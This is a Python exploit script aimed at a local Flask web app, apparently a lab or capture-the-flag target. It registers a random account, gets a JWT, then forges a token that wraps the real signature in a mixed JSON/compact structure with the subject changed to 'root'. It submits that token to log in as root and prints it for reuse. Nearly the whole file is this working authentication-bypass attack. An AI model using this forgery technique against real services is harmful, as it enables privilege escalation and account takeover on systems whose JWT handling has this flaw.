import requests
import random
import string
import json
from jwcrypto.common import base64url_decode, base64url_encode


# Constant
url_base = "http://127.0.0.1:5000"

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def register(username, password):
    url = url_base + "/register"
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)

    if response.status_code == 200:
        print('Registration successful')
        return True
    else:
        print('Registration failed: {}'.format(response.text))
        return False

def login(username, password):
    url = url_base + "/login_json"  # Change this to your actual URL
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)

    json_string = response.text[response.text.index('{'):]
    response_dict = json.loads(json_string)

    if response.status_code != 200:  # Redirect status
        print("Not good login :()")
        return None
    else:
        return response_dict['token']


def me(username, token):
    url = url_base + "/me"  # Change this to your actual URL
    params = {'username': username, 'token': token}
    response = requests.get(url, params=params)

    print(response.text)

def call_token_login(token):
    url = url_base + "/token_login_json"  # Replace with your Flask server's URL
    response = requests.post(url, data={'token': token})

    print(response.text)

    if response.status_code != 200:  # Redirect status
        print("Not good token :(")
        return None
    else:
        print("Use this token to login as root ;)")
        print(token)
        return token

def forge_token(token, username_l):
    # Split the generated JWT into three components: header, payload, and signature
    [header, payload, signature] = token.split('.')
    
    # Decode the payload and parse the JSON to get a Python dictionary
    parsed_payload = json.loads(base64url_decode(payload))
    
    # Change the 'sub' claim in the parsed payload to 'root'
    parsed_payload['sub'] = username_l
    
    # Set an expiry time to a future value
    parsed_payload['exp'] = 2000000000
    
    # Encode the modified payload back to a JSON string and then base64url-encode it
    fake_payload = base64url_encode(json.dumps(parsed_payload, separators=(',', ':')))
    
    # Forge a token using a mix of JSON and compact serialization format to test the library's resilience
    forged_token = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

    return forged_token

# Usage
username = get_random_string(8) 
password = get_random_string(8) 

if register(username, password):
    token = login(username, password)
    if token:
        me(username, token)

        forged_token = forge_token(token, 'root')
        call_token_login(forged_token)